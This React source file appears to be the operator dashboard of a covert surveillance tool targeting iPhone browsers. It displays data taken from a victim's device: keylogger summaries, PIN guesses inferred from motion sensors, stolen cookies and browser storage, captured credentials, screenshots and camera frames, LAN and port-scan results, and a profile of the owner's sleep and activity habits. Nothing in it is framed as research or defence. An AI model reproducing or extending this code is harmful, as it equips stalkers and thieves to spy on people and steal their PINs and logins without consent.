          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 6 }}>{dateStr} {timeStr} - Stream ({(d.durationMs/1000).toFixed(1)}s, {d.count} readings){latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ fontSize: 12, fontVariantNumeric: 'tabular-nums' }}>
            {avgCompass != null && <div style={{ color: '#f59e0b', fontWeight: 600, marginBottom: 4 }}>🧭 avg {avgCompass}° {cardDir}</div>}
            <div style={{ color: '#4e5a70', fontSize: 11 }}>{d.count} samples · {(d.durationMs/1000).toFixed(1)}s</div>
          </div>
        </div>
      );
    }

    // ── Motion analysis types ─────────────────────────────────────────────────
    if (item.type === 'motion_session_live') {
      const d = parseData(item.raw.data_json);
      const actColor = { stationary:'#4e5a70', walking:'#22c55e', running:'#f59e0b', in_vehicle:'#3b82f6', fidgeting:'#ef4444', unknown:'#4e5a70' }[d.activity] ?? '#4e5a70';
      const elevIcon = { ascending:'⬆', descending:'⬇', stationary:'', movement:'↕' }[d.elevator] ?? '';
      return (
        <div key={item.id} style={{ ...rowStyle, borderColor: isLatest ? 'rgba(34,197,94,0.25)' : 'rgba(255,255,255,0.09)' }}>
          <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:5 }}>
            <div style={{ fontSize:11, color:'#4e5a70' }}>
              {dateStr} {timeStr}
              {isLatest && <span style={{ marginLeft:8, color:'#22c55e', fontWeight:700, fontSize:10 }}>● LIVE</span>}
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:8 }}>
              <span style={{ fontSize:11, color:'#4e5a70' }}>{d.elapsed != null ? (d.elapsed/1000).toFixed(0)+'s' : ''}</span>
              <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method:'DELETE' }); onLoad(); }} />
            </div>
          </div>
          <div style={{ display:'flex', gap:6, flexWrap:'wrap' }}>
            <span style={{ background:actColor+'22', border:`1px solid ${actColor}44`, color:actColor, padding:'2px 8px', borderRadius:6, fontSize:12, fontWeight:700 }}>
              {d.activity?.replace(/_/g,' ') ?? '-'}
            </span>
            <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'2px 8px', borderRadius:6, fontSize:12, fontWeight:700 }}>
              {d.context?.replace(/_/g,' ') ?? '-'}
            </span>
            {elevIcon && <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'2px 8px', borderRadius:6, fontSize:12, fontWeight:700 }}>{elevIcon} {d.elevator}</span>}
            {d.compassHeading != null && <span style={{ background:'rgba(245,158,11,0.13)', border:'1px solid rgba(245,158,11,0.27)', color:'#f59e0b', padding:'2px 8px', borderRadius:6, fontSize:12 }}>🧭 {d.compassHeading}° {d.cardinal}</span>}
            {d.steps > 0 && <span style={{ background:'rgba(59,130,246,0.13)', border:'1px solid rgba(59,130,246,0.27)', color:'#3b82f6', padding:'2px 8px', borderRadius:6, fontSize:12 }}>👣 {d.steps} steps</span>}
            {d.totalKeystrokes > 0 && <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'2px 8px', borderRadius:6, fontSize:12 }}>⌨️ {d.totalKeystrokes}</span>}
          </div>
        </div>
      );
    }

    if (item.type === 'motion_session_started') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle, opacity: 0.6 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr} - ▶ Session started{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
        </div>
      );
    }

    if (item.type === 'motion_session_summary') {
      const d = parseData(item.raw.data_json);
      const actColor = { stationary: '#4e5a70', walking: '#22c55e', running: '#f59e0b', in_vehicle: '#3b82f6', fidgeting: '#ef4444', unknown: '#4e5a70' }[d.activity] ?? '#4e5a70';
      const elevIcon = { ascending: '⬆', descending: '⬇', stationary: '-', movement: '↕' }[d.elevator] ?? '?';
      return (
        <div key={item.id} style={{ ...rowStyle, border: '1px solid #30d15840', background: '#30d15808' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div style={{ fontSize: 11, color: '#22c55e', fontWeight: 700, marginBottom: 8 }}>
              ⏹ SESSION SUMMARY - {d.durationSec}s · {d.sampleCount} samples{latestBadge}
            </div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>

          {/* Activity + Context row */}
          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 8 }}>
            <span style={{ background: actColor+'22', border:`1px solid ${actColor}44`, color: actColor, padding:'3px 10px', borderRadius:8, fontSize:12, fontWeight:700 }}>
              {d.activity?.replace(/_/g,' ') ?? '-'}
            </span>
            <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'3px 10px', borderRadius:8, fontSize:12, fontWeight:700 }}>
              {d.context?.replace(/_/g,' ') ?? '-'}
            </span>
            {d.elevator && d.elevator !== 'stationary' && (
              <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'3px 10px', borderRadius:8, fontSize:12, fontWeight:700 }}>
                {elevIcon} {d.elevator}
              </span>
            )}
            {d.cardinal && (
              <span style={{ background:'rgba(245,158,11,0.13)', border:'1px solid rgba(245,158,11,0.27)', color:'#f59e0b', padding:'3px 10px', borderRadius:8, fontSize:12, fontWeight:700 }}>
                🧭 {d.compassHeading}° {d.cardinal}
              </span>
            )}
          </div>

          {/* Stats grid */}
          <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '3px 12px', fontSize: 12, marginBottom: 8 }}>
            {d.tremor?.tremorClass && <><span style={{ color:'#4e5a70' }}>Tremor</span><span style={{ color:'#fff' }}>{d.tremor.tremorClass.replace(/_/g,' ')} (RMS {d.tremor.rms})</span></>}
            {d.gait && <>
              <span style={{ color:'#4e5a70' }}>Gait</span>
              <span style={{ color:'#fff' }}>{d.gait.stepCount} steps · {d.gait.cadence} spm · {d.gait.estDistanceM}m · regularity {d.gait.regularity}</span>
            </>}
            {d.navigation?.stepCount > 0 && !d.gait && <>
              <span style={{ color:'#4e5a70' }}>Steps</span><span style={{ color:'#fff' }}>{d.navigation.stepCount} · ~{d.navigation.distanceM}m</span>
            </>}
            {d.navigation?.displacement && <>
              <span style={{ color:'#4e5a70' }}>Displacement</span>
              <span style={{ color:'#fff' }}>↑{d.navigation.displacement.dy}m →{d.navigation.displacement.dx}m</span>
            </>}
            {d.keystrokes && <>
              <span style={{ color:'#4e5a70' }}>Keystrokes</span>
              <span style={{ color:'#fff' }}>{d.keystrokes.count} ({d.keystrokes.wordCount} words: {(d.keystrokes.wordLengths??[]).join(', ')})</span>
              <span style={{ color:'#4e5a70' }}>Row heat</span>
              <span style={{ color:'#fff' }}>
                <span style={{ color:'#3b82f6' }}>top:{d.keystrokes.rowHeatmap?.top??0}</span>{' '}
                <span style={{ color:'#f59e0b' }}>mid:{d.keystrokes.rowHeatmap?.mid??0}</span>{' '}
                <span style={{ color:'#22c55e' }}>bot:{d.keystrokes.rowHeatmap?.bot??0}</span>
              </span>
            </>}
          </div>

          {/* PIN candidates */}
          {d.keystrokes?.pinCandidates?.length > 0 && (
            <div style={{ padding:'8px 10px', background:'#ff453a15', border:'1px solid rgba(239,68,68,0.27)', borderRadius:8 }}>
              <div style={{ color:'#ef4444', fontWeight:700, fontSize:12, marginBottom:6 }}>🔐 PIN CANDIDATES ({d.keystrokes.pinCandidates.length})</div>
              {d.keystrokes.pinCandidates.map((c,i) => (
                <div key={i} style={{ marginBottom:7 }}>
                  <span style={{ fontSize:11, color:'#4e5a70' }}>{c.digits}-digit · avg {c.avgGapMs}ms</span>
                  <div style={{ fontFamily:'monospace', fontSize:11, color:'#4e5a70', marginTop:2 }}>{pinSeqLabel(c)}</div>
                  <div style={{ fontFamily:'monospace', fontSize:18, color:'#f59e0b', fontWeight:700, letterSpacing:4, marginTop:2 }}>
                    {pinDigits(c)}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      );
    }

    if (item.type === 'motion_keystroke_event') {
      const d = parseData(item.raw.data_json);
      const k = d.k ?? {};
      const rowColor = { top: '#3b82f6', mid: '#f59e0b', bot: '#22c55e' }[k.row] ?? '#4e5a70';
      const sideIcon = { left: '←', center: '·', right: '→' }[k.side] ?? '?';
      return (
        <div key={item.id} style={{ ...rowStyle }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr} - ⌨️ Key #{d.total}{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ display: 'flex', gap: 10, marginTop: 4, fontSize: 12, alignItems: 'center' }}>
            <span style={{ background: rowColor + '22', border: `1px solid ${rowColor}44`, color: rowColor, padding: '2px 8px', borderRadius: 6, fontWeight: 700 }}>{k.row ?? '?'}</span>
            <span style={{ color: '#c9d1e8', fontWeight: 700, fontSize: 16 }}>{sideIcon}</span>
            {k.peak != null && <span style={{ color: '#4e5a70' }}>peak {k.peak}</span>}
            {k.gap  != null && <span style={{ color: '#4e5a70' }}>{k.gap}ms</span>}
          </div>
        </div>
      );
    }

    if (item.type === 'motion_keystrokes') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 6 }}>{dateStr} {timeStr} - ⌨️ Keylogger Summary{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '3px 12px', fontSize: 12 }}>
            <span style={{ color: '#4e5a70' }}>Keystrokes</span><span style={{ color: '#c9d1e8' }}>{d.count}</span>
            <span style={{ color: '#4e5a70' }}>Rate</span><span style={{ color: '#c9d1e8' }}>{d.tapsPerSec}/s</span>
            <span style={{ color: '#4e5a70' }}>Duration</span><span style={{ color: '#c9d1e8' }}>{d.elapsed != null ? (d.elapsed/1000).toFixed(1)+'s' : '-'}</span>
            <span style={{ color: '#4e5a70' }}>Words~</span><span style={{ color: '#c9d1e8' }}>{d.wordCount} ({(d.wordLengths??[]).join(', ')})</span>
            {d.rowHeatmap && <>
              <span style={{ color: '#4e5a70' }}>Row heat</span>
              <span style={{ color: '#c9d1e8' }}>
                <span style={{ color: '#3b82f6' }}>top:{d.rowHeatmap.top}</span>{' '}
                <span style={{ color: '#f59e0b' }}>mid:{d.rowHeatmap.mid}</span>{' '}
                <span style={{ color: '#22c55e' }}>bot:{d.rowHeatmap.bot}</span>
              </span>
            </>}
            {d.sideHeatmap && <>
              <span style={{ color: '#4e5a70' }}>Side heat</span>
              <span style={{ color: '#c9d1e8' }}>←{d.sideHeatmap.left} ·{d.sideHeatmap.center} →{d.sideHeatmap.right}</span>
            </>}
          </div>
          {d.pinCandidates?.length > 0 && (
            <div style={{ marginTop: 8, padding: '8px 10px', background: '#ff453a15', border: '1px solid rgba(239,68,68,0.27)', borderRadius: 8 }}>
              <div style={{ color: '#ef4444', fontWeight: 700, fontSize: 12, marginBottom: 6 }}>🔐 PIN CANDIDATES ({d.pinCandidates.length})</div>
              {d.pinCandidates.map((c, i) => (
                <div key={i} style={{ marginBottom: 7 }}>
                  <span style={{ fontSize: 11, color: '#4e5a70' }}>{c.digits}-digit · avg {c.avgGapMs}ms</span>
                  <div style={{ fontFamily: 'monospace', fontSize: 11, color: '#4e5a70', marginTop: 2 }}>{pinSeqLabel(c)}</div>
                  <div style={{ fontFamily: 'monospace', fontSize: 18, color: '#f59e0b', fontWeight: 700, letterSpacing: 4, marginTop: 2 }}>
                    {pinDigits(c)}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      );
    }

    if (item.type === 'motion_tap_detected') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr} - 🔑 Tap #{d.totalCount}{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '3px 12px', fontSize: 12, marginTop: 4 }}>
            {d.tap?.peak  != null && <><span style={{ color: '#4e5a70' }}>Peak</span><span style={{ color: '#c9d1e8' }}>{d.tap.peak} m/s²</span></>}
            {d.tap?.baseline != null && <><span style={{ color: '#4e5a70' }}>Baseline</span><span style={{ color: '#c9d1e8' }}>{d.tap.baseline} m/s²</span></>}
            {d.elapsed != null && <><span style={{ color: '#4e5a70' }}>Elapsed</span><span style={{ color: '#c9d1e8' }}>{(d.elapsed/1000).toFixed(1)}s</span></>}
          </div>
        </div>
      );
    }

    if (['motion_activity','motion_gait','motion_context','motion_tremor','motion_taps',
         'motion_elevator','motion_photo','motion_dead_reckoning','motion_profile'].includes(item.type)) {
      const d = parseData(item.raw.data_json);
      const typeLabels = {
        motion_activity: '🏃 Activity', motion_gait: '🚶 Gait', motion_context: '📱 Context',
        motion_tremor: '✋ Tremor', motion_taps: '🔑 Taps', motion_elevator: '🏢 Elevator',
        motion_photo: '📸 Photo', motion_dead_reckoning: '🧭 Dead Reckoning', motion_profile: '🧬 Profile',
      };
      const label = typeLabels[item.type] ?? item.type;

      // Build key-value rows from result
      const rows = [];
      if (d.error)         rows.push(['Error', d.error]);
      if (d.activity)      rows.push(['Activity', d.activity.replace(/_/g,' ')]);
      if (d.context)       rows.push(['Context', d.context.replace(/_/g,' ')]);
      if (d.tremorClass)   rows.push(['Tremor class', d.tremorClass.replace(/_/g,' ')]);
      if (d.verdict)       rows.push(['Verdict', d.verdict.replace(/_/g,' ')]);
      if (d.photoLikely != null) rows.push(['Photo detected', d.photoLikely ? 'YES' : 'no']);
      if (d.compassHeading != null) rows.push(['Compass', `${d.compassHeading}° ${d.cardinal ?? ''}`]);
      if (d.stepCount != null) rows.push(['Steps', d.stepCount]);
      if (d.cadence != null)   rows.push(['Cadence', `${d.cadence} steps/min`]);
      if (d.distanceM != null) rows.push(['Distance', `${d.distanceM} m`]);
      if (d.tapCount != null)  rows.push(['Taps', d.tapCount]);
      if (d.tapsPerSec != null) rows.push(['Rate', `${d.tapsPerSec}/s`]);
      if (d.elapsed != null)   rows.push(['Duration', `${(d.elapsed/1000).toFixed(1)}s`]);
      if (d.rms != null)       rows.push(['Tremor RMS', d.rms]);
      if (d.dominantHz != null) rows.push(['Freq', `${d.dominantHz} Hz`]);
      if (d.regularity != null) rows.push(['Regularity', d.regularity]);
      if (d.durationSec != null) rows.push(['Duration', `${d.durationSec}s`]);
      if (d.displacement) rows.push(['Displacement', `↑${d.displacement.dy}m →${d.displacement.dx}m`]);

      return (
        <div key={item.id} style={{ ...rowStyle }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 6 }}>{dateStr} {timeStr} - {label}{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '3px 12px', fontSize: 12 }}>
            {rows.map(([k, v], i) => (<React.Fragment key={i}>
              <span style={{ color: '#4e5a70' }}>{k}</span>
              <span style={{ color: ['Activity','Context','Verdict','Compass','Photo detected'].includes(k) ? '#fff' : 'rgba(201,209,232,0.80)', fontWeight: ['Activity','Photo detected'].includes(k) ? 600 : 400 }}>{v}</span>
            </React.Fragment>))}
          </div>
        </div>
      );
    }


    if (item.type === 'cookies') {
      const d = parseData(item.raw.data_json);
      const cookies = d.cookies ?? [];
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div style={{ flex: 1 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
              <span style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}</span>
              <span style={{ fontSize: 9, color: '#f59e0b', background: 'rgba(245,158,11,0.13)', borderRadius: 4, padding: '1px 6px', border: '1px solid rgba(245,158,11,0.27)' }}>{cookies.length} cookies</span>
              {latestBadge}
            </div>
            {cookies.length === 0 && <div style={{ fontSize: 12, color: '#4e5a70' }}>No cookies</div>}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
              {cookies.map((c, i) => (
                <div key={i} style={{ fontSize: 11, fontFamily: 'monospace', display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                  <span style={{ color: '#f59e0b', fontWeight: 600 }}>{c.name}</span>
                  <span style={{ color: 'rgba(201,209,232,0.80)', wordBreak: 'break-all', maxWidth: 300 }}>{c.value}</span>
                  {c.secure && <span style={{ color: '#22c55e', fontSize: 9 }}>🔒</span>}
                </div>
              ))}
            </div>
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'storage') {
      const d = parseData(item.raw.data_json);
      const lsKeys = Object.keys(d.localStorage ?? {});
      const ssKeys = Object.keys(d.sessionStorage ?? {});
      const idbList = d.indexedDB ?? [];
      const bridge = d.webkitBridge ?? [];
      const cacheList = d.cacheStorage ?? [];
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div style={{ flex: 1 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
              <span style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}</span>
              {latestBadge}
            </div>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6, marginBottom: 6 }}>
              <span style={{ fontSize: 10, color: '#a78bfa', background: 'rgba(167,139,250,0.13)', borderRadius: 4, padding: '2px 7px', border: '1px solid rgba(167,139,250,0.27)' }}>localStorage: {lsKeys.length} keys</span>
              <span style={{ fontSize: 10, color: '#a78bfa', background: 'rgba(167,139,250,0.13)', borderRadius: 4, padding: '2px 7px', border: '1px solid rgba(167,139,250,0.27)' }}>sessionStorage: {ssKeys.length} keys</span>
              {idbList.length > 0 && <span style={{ fontSize: 10, color: '#3b82f6', background: 'rgba(59,130,246,0.13)', borderRadius: 4, padding: '2px 7px', border: '1px solid rgba(59,130,246,0.27)' }}>IndexedDB: {idbList.map(db => db.name).join(', ')}</span>}
              {d.webSQLSupported && <span style={{ fontSize: 10, color: '#f59e0b', background: 'rgba(245,158,11,0.13)', borderRadius: 4, padding: '2px 7px', border: '1px solid rgba(245,158,11,0.27)' }}>WebSQL ✓</span>}
              {bridge.length > 0 && <span style={{ fontSize: 10, color: '#ef4444', background: 'rgba(239,68,68,0.13)', borderRadius: 4, padding: '2px 7px', border: '1px solid rgba(239,68,68,0.27)' }}>🔗 Native bridge: {bridge.join(', ')}</span>}
              {cacheList.length > 0 && <span style={{ fontSize: 10, color: '#4e5a70', background: 'rgba(255,255,255,0.09)', borderRadius: 4, padding: '2px 7px' }}>Cache: {cacheList.join(', ')}</span>}
            </div>
            {lsKeys.length > 0 && (
              <div style={{ marginTop: 4 }}>
                <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 3 }}>localStorage</div>
                {lsKeys.slice(0, 8).map(k => (
                  <div key={k} style={{ fontSize: 11, fontFamily: 'monospace', color: 'rgba(201,209,232,0.80)' }}>
                    <span style={{ color: '#a78bfa' }}>{k}</span>: {String(d.localStorage[k]).slice(0, 80)}
                  </div>
                ))}
                {lsKeys.length > 8 && <div style={{ fontSize: 10, color: '#4e5a70' }}>+{lsKeys.length - 8} more…</div>}
              </div>
            )}
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'lan') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'center' }}>
          <div style={{ flex: 1 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
              <span style={{ fontSize: 13, color: '#22c55e', fontFamily: 'monospace', fontWeight: 600 }}>{d.ip}</span>
              {d.port && <span style={{ fontSize: 10, color: '#3b82f6', background: 'rgba(59,130,246,0.09)', border: '1px solid rgba(59,130,246,0.20)', borderRadius: 4, padding: '1px 6px', fontFamily: 'monospace' }}>:{d.port}</span>}
              {latestBadge}
            </div>
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 2, fontFamily: 'monospace' }}>{d.cidr} · {d.ms}ms</div>
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 1 }}>{dateStr} {timeStr}</div>
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'portscan') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'center' }}>
          <div style={{ flex: 1 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
              <span style={{ fontSize: 13, color: '#f59e0b', fontFamily: 'monospace', fontWeight: 600 }}>{d.ip}</span>
              <span style={{ fontSize: 11, color: '#22c55e', background: 'rgba(34,197,94,0.09)', border: '1px solid #30d15833', borderRadius: 4, padding: '1px 6px', fontFamily: 'monospace' }}>:{d.port}</span>
              {latestBadge}
            </div>
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 2, fontFamily: 'monospace' }}>{d.ms}ms</div>
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 1 }}>{dateStr} {timeStr}</div>
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'gpu') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div style={{ flex: 1 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
              <span style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}</span>
              {d.supported === false && <span style={{ fontSize: 10, color: '#ef4444' }}>WebGPU not supported</span>}
              {latestBadge}
            </div>
            {d.supported !== false && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                {(d.vendor || d.architecture) && (
                  <div style={{ fontSize: 12, color: '#3b82f6' }}>
                    {[d.vendor, d.architecture, d.device].filter(Boolean).join(' · ')}
                  </div>
                )}
                {d.webgl && (
                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: 'rgba(201,209,232,0.80)' }}>
                    {d.webgl.renderer} · {d.webgl.vendor}
                  </div>
                )}
                {d.features && <div style={{ fontSize: 10, color: '#4e5a70' }}>{d.features.length} WebGPU features</div>}
                {d.limits?.maxTextureDimension2D && (
                  <div style={{ fontSize: 10, color: '#4e5a70' }}>
                    maxTexture2D: {d.limits.maxTextureDimension2D} · maxBuffer: {(d.limits.maxBufferSize / (1024 * 1024)).toFixed(0)}MB
                  </div>
                )}
              </div>
            )}
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    return null;
  }

  const populated = INTEL_GROUPS.filter(g => (byGroup[g.id] ?? []).length > 0);
  const totalItems = Object.values(byGroup).reduce((s, a) => s + a.length, 0);

  if (!populated.length) {
    return <div style={{ padding: 40, textAlign: 'center', color: '#4e5a70', fontSize: 13 }}>No intelligence collected yet.</div>;
  }

  return (
    <div>
      {/* Global clear - clearly labeled */}
      <GlobalClearMenu deviceId={deviceId} onDone={onLoad} />

      <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
        {populated.map(g => {
          const items = byGroup[g.id];
          const isCollapsed = collapsed[g.id];
          return (
            <div key={g.id}>
              {/* Group header */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: isCollapsed ? 0 : 10 }}>
                <div onClick={() => toggleCollapse(g.id)} style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer', flex: 1 }}>
                  <span style={{ fontSize: 14 }}>{g.icon}</span>
                  <span style={{ fontSize: 13, fontWeight: 700, color: g.color, textTransform: 'uppercase', letterSpacing: '0.07em' }}>{g.label}</span>
                  <span style={{ fontSize: 11, color: '#4e5a70', background: '#141728', padding: '1px 7px', borderRadius: 10 }}>{items.length}</span>
                  <span style={{ fontSize: 11, color: '#4e5a70', marginLeft: 4 }}>{isCollapsed ? '▶' : '▼'}</span>
                </div>
                <ClearMenu groupId={g.id} groupLabel={g.label} deviceId={deviceId} onDone={onLoad} />
              </div>

              {!isCollapsed && (
                <div style={{ background: '#0c0d1a', borderRadius: 12, border: `1px solid ${g.color}22`, padding: '0 16px' }}>
                  {g.id === 'geo'
                    ? buildGeoSessions(items).map((seg, idx) =>
                        seg.type === 'once'
                          ? renderItem(seg.items[0], idx === 0)
                          : <GeoIntelSession key={`gs-${idx}`} items={seg.items} isLatest={idx === 0} deviceId={deviceId} onLoad={onLoad} />
                      )
                    : g.id === 'motion'
                      ? <MotionGroupView items={items} deviceId={deviceId} onLoad={onLoad} renderItem={renderItem} />
                      : items.map((item, idx) => renderItem(item, idx === 0))
                  }
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

function InsightsPanel({ device, events, screenshots, cameraFrames, creds }) {
  const fp           = parseEvent(events?.find(e => e.type === 'fingerprint'));
  const netData      = device?.current_network_type ?? null;
  const permRaw      = parseEvent(events?.find(e => e.type === 'permissions')) ?? {};
  const hbAll        = (events ?? []).filter(e => e.type === 'heartbeat');
  const latestHb     = parseEvent(hbAll[0]);
  const appOpens     = (events ?? []).filter(e => e.type === 'app_open');
  const geoEvents    = (events ?? []).filter(e => e.type === 'geolocation');
  const ua           = device?.user_agent ?? fp?.ua;
  const iosVer       = ua?.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.');
  const iosMajor     = iosVer ? parseInt(iosVer) : null;

  const screenKey    = fp?.screen ? `${fp.screen.w}×${fp.screen.h}` : '';
  const PREMIUM_SCREENS = ['440×956','402×874','430×932','428×926'];
  const isPremium    = PREMIUM_SCREENS.includes(screenKey);
  const isProModel   = ['440×956','402×874'].includes(screenKey);
  const tier         = isProModel ? 'Pro/Max' : isPremium ? 'Standard+' : 'Mid/SE';

  const PERM_WEIGHTS = { geolocation:25, camera:20, microphone:20, notifications:15, motion:10, 'clipboard-read':10, 'web-audio':5, 'persistent-storage':5 };
  const grantedPerms = Object.entries(permRaw).filter(([,v]) => v === 'granted' || v === 'activated').map(([k]) => k);
  const permScore    = grantedPerms.reduce((s, k) => s + (PERM_WEIGHTS[k] ?? 2), 0);
  const audioActive  = latestHb?.audio === 'running';
  const isOnline     = device?.last_seen && (Date.now() - parseUTC(device.last_seen).getTime()) < 30000;
  const hasPersist   = audioActive && isOnline;
  const credCount    = creds?.length ?? 0;

  // ── Heartbeat timeline (chronological asc for analysis) ──────────────────
  const hbTimeline   = hbAll.map(e => ({ ts: parseUTC(e.timestamp), d: parseEvent(e) }))
    .filter(h => h.ts && h.d).sort((a,b) => a.ts - b.ts);
  const hbDesc       = hbTimeline.slice().reverse();

  // Background periods (visible=false runs)
  const bgPeriods = [];
  for (let i = 1; i < hbTimeline.length; i++) {
    const prv = hbTimeline[i-1], cur = hbTimeline[i];
    if (prv.d.visible === false) {
      const ms = cur.ts - prv.ts;
      if (ms > 30000) bgPeriods.push({ dur: ms, ts: prv.ts, audio: prv.d.audio });
    }
  }
  const longestBg = bgPeriods.length ? Math.max(...bgPeriods.map(b=>b.dur)) : 0;
  const avgBg     = bgPeriods.length ? bgPeriods.reduce((s,b)=>s+b.dur,0)/bgPeriods.length : 0;

  // Active hours
  const openTimes    = appOpens.map(e => parseUTC(e.timestamp)).filter(Boolean);
  const hourBuckets  = Array(24).fill(0);
  openTimes.forEach(t => { hourBuckets[t.getHours()]++; });
  const peakHour     = hourBuckets.indexOf(Math.max(...hourBuckets));
  const nightHours   = [22,23,0,1,2,3,4,5,6];
  const nightOpens   = nightHours.reduce((s,h) => s + hourBuckets[h], 0);
  const dayOpens     = openTimes.length - nightOpens;
  const sleepPattern = openTimes.length >= 3
    ? (nightOpens < dayOpens * 0.1 ? 'Regular sleeper (inactive 22:00–06:00)' : 'Active at night - possible shift worker or night owl')
    : null;

  // Network
  // IP history - supports both old plain-string format and new {ip, ts} format
